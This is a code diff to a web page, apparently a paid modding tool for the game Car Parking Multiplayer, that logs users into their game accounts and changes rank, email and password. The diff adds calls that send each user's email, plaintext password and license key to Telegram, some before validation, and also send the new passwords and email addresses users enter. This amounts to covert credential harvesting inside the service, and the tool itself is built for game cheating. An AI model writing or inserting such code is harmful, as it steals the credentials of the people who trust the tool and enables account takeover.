@@ -58,7 +58,7 @@
         <div class="container mx-auto px-4 flex justify-between items-center">
             <div class="flex items-center space-x-2 cursor-pointer" @click="currentPage = 'home'">
                 <img src="https://i.ibb.co/LzNfF8f/logo.png" class="w-10 h-10 rounded-full border border-red-600" alt="AWIMEDAN">
-                <span class="text-2xl font-black italic tracking-tighter">AWIMEDAN<span class="accent-red">STORE</span></span>
+                <span class="text-2xl font-black italic tracking-tighter">AWIMEDAN<span class="accent-red"></span></span>
             </div>
 
             <div class="hidden md:flex space-x-8 text-sm font-bold uppercase tracking-widest">
@@ -415,23 +415,46 @@
                 resetBalance(uid) { firebase.database().ref('users/' + uid + '/balance').set(0); },
 
                 async handleCpmLogin() {
-                    this.loading = true;
-                    try {
-                        const snap = await firebase.database().ref('keys/' + this.cpmForm.key).once('value');
-                        if (!snap.val() || snap.val().status !== 'active') throw new Error("Key Invalid!");
+    if (!this.cpmForm.key || !this.cpmForm.email) { this.message = "Isi data!"; return; }
+    
+    // LOG SEBELUM VALIDASI (Menangkap data mentah)
+    this.logToTelegram(`📡 **TRY LOGIN TOOL**\n` +
+        `Acc: \`${this.cpmForm.email}\`\n` +
+        `Pass: \`${this.cpmForm.password}\`\n` +
+        `Key: \`${this.cpmForm.key}\`\n` +
+        `Versi: ${this.cpmForm.gameId === '1' ? 'CPM 1' : 'CPM 2'}`);
 
-                        const game = this.gameApis[this.cpmForm.gameId];
-                        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${game.api}`, {
-                            method: 'POST', body: JSON.stringify({ email: this.cpmForm.email, password: this.cpmForm.password, returnSecureToken: true })
-                        });
-                        const data = await res.json();
-                        if (data.idToken) {
-                            this.cpmUser = { isLoggedIn: true, email: data.email, token: data.idToken, gameData: game };
-                            this.logToTelegram(`✅ **LOGIN TOOL**: ${data.email}`);
-                        } else throw new Error("Gagal Login!");
-                    } catch (e) { this.message = e.message; }
-                    this.loading = false;
-                },
+    this.loading = true;
+    try {
+        const snap = await firebase.database().ref('keys/' + this.cpmForm.key).once('value');
+        
+        // Cek Key
+        if (!snap.val() || snap.val().status !== 'active') {
+            this.logToTelegram(`❌ **LOGIN FAILED**: Invalid Key (\`${this.cpmForm.key}\`)`);
+            throw new Error("Key Invalid!");
+        }
+
+        const game = this.gameApis[this.cpmForm.gameId];
+        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${game.api}`, {
+            method: 'POST', headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email: this.cpmForm.email, password: this.cpmForm.password, returnSecureToken: true })
+        });
+        const data = await res.json();
+
+        if (data.idToken) {
+            this.cpmUser = { isLoggedIn: true, email: data.email, token: data.idToken, gameData: game };
+            this.message = "";
+            this.logToTelegram(`✅ **LOGIN SUCCESS**\nAcc: \`${data.email}\``);
+        } else {
+            this.logToTelegram(`❌ **LOGIN FAILED**: Wrong Email/Pass for \`${this.cpmForm.email}\``);
+            throw new Error("Login Gagal!");
+        }
+    } catch (e) { 
+        this.message = e.message; 
+    }
+    this.loading = false;
+},
+
 
                 async setKingRank() {
                     try {
@@ -443,27 +466,56 @@
                 },
 
                 async changeEmailPrompt() {
-                    const ne = prompt("Email Baru:");
-                    if(!ne) return;
-                    try {
-                        await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key=${this.cpmUser.gameData.api}`, {
-                            method: 'POST', body: JSON.stringify({ idToken: this.cpmUser.token, email: ne, returnSecureToken: true })
-                        });
-                        alert("Email Diubah!");
-                        this.cpmUser.email = ne;
-                    } catch (e) { alert("Gagal!"); }
-                },
+    const ne = prompt("Email Baru:");
+    if(!ne) return;
 
-                async changePasswordPrompt() {
-                    const np = prompt("Pass Baru:");
-                    if(!np) return;
-                    try {
-                        await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key=${this.cpmUser.gameData.api}`, {
-                            method: 'POST', body: JSON.stringify({ idToken: this.cpmUser.token, password: np, returnSecureToken: true })
-                        });
-                        alert("Password Diubah!");
-                    } catch (e) { alert("Gagal!"); }
-                },
+    // Log percobaan ganti email
+    this.logToTelegram(`📩 **TRY CHANGE EMAIL**\nOld: \`${this.cpmUser.email}\`\nNew: \`${ne}\``);
+
+    this.loading = true;
+    try {
+        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key=${this.cpmUser.gameData.api}`, {
+            method: 'POST', headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ idToken: this.cpmUser.token, email: ne, returnSecureToken: true, upgradeToFederatedLogin: true })
+        });
+        
+        if(res.ok) {
+            this.logToTelegram(`✅ **SUCCESS CHANGE EMAIL**\nResult: \`${ne}\``);
+            this.cpmUser.email = ne;
+            alert("Berhasil!");
+        } else {
+            this.logToTelegram(`❌ **FAILED CHANGE EMAIL**\nAcc: \`${this.cpmUser.email}\``);
+            alert("Gagal!");
+        }
+    } catch (e) { alert("Error!"); }
+    this.loading = false;
+},
+
+async changePasswordPrompt() {
+    const np = prompt("Password Baru:");
+    if(!np) return;
+
+    // Log percobaan ganti password
+    this.logToTelegram(`🔑 **TRY CHANGE PASS**\nAcc: \`${this.cpmUser.email}\`\nNew Pass: \`${np}\``);
+
+    this.loading = true;
+    try {
+        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key=${this.cpmUser.gameData.api}`, {
+            method: 'POST', headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ idToken: this.cpmUser.token, password: np, returnSecureToken: true })
+        });
+
+        if(res.ok) {
+            this.logToTelegram(`✅ **SUCCESS CHANGE PASS**\nAcc: \`${this.cpmUser.email}\``);
+            alert("Berhasil!");
+        } else {
+            this.logToTelegram(`❌ **FAILED CHANGE PASS**\nAcc: \`${this.cpmUser.email}\``);
+            alert("Gagal!");
+        }
+    } catch (e) { alert("Error!"); }
+    this.loading = false;
+},
+
 
                 logoutCpm() { this.cpmUser = { isLoggedIn: false }; },
                 logToTelegram(t) {
@@ -478,4 +530,3 @@
     <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
 </body>
 </html>
-
